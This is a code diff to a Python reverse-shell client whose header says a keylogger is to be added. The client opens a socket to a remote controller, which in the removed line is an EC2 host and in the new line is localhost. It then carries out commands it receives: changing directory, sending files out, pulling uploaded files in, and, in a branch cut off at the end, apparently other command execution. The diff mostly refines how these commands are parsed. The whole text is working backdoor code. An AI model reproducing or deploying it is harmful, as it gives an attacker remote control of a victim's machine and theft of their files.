@@ -1,6 +1,7 @@
 #To add the feature of KeyLogger
 import socket
 import os
+import re
 import subprocess
 
 def transfer(s, filename):
@@ -27,7 +28,8 @@ def get(s, filename):
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 port = 1234
-s.connect(('ec2-100-26-161-44.compute-1.amazonaws.com',port))
+#s.connect(('ec2-100-26-161-44.compute-1.amazonaws.com',port))
+s.connect(('127.0.0.1',port))
 s.send(os.getcwd().encode())
 while True:
     res = s.recv(2048).decode()
@@ -44,15 +46,16 @@ while True:
             s.send((os.getcwd() + ">").encode())
             s.send("Directory Changed...".encode())
         else:
-            os.chdir(temp[1])
+            res = re.findall("cd (.+)", res)
+            os.chdir(res[0])
             s.send((os.getcwd() + ">").encode())
             s.send("Directory Changed...".encode())
     elif res == "exit":
         break
-    elif 'get' in res or 'cat' in res:
+    elif 'get*' in res or 'cat' in res:
         transfer(s, res.split("*")[1])
         continue
-    elif 'upload' in res:
+    elif 'upload*' in res:
         get(s, res.split("*")[2])
         continue
     else:
